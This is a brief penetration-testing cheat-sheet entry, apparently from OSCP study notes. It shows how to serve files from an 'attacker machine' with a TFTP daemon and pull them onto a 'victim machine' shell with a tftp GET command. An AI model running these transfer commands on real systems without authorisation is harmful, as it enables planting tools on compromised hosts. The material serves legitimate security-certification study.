
**TFTP** (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.) [ref](https://github.com/pythonmaster41/Go-For-OSCP)
```powershell
# On attacker machine:

mkdir tftp
atftpd --deamon --port 69 tftp
cp $FILE tftp
# On victim machine shell:
tftp -i $IP GET $FILE
```


[pythonmaster41](https://github.com/pythonmaster41/Go-For-OSCP)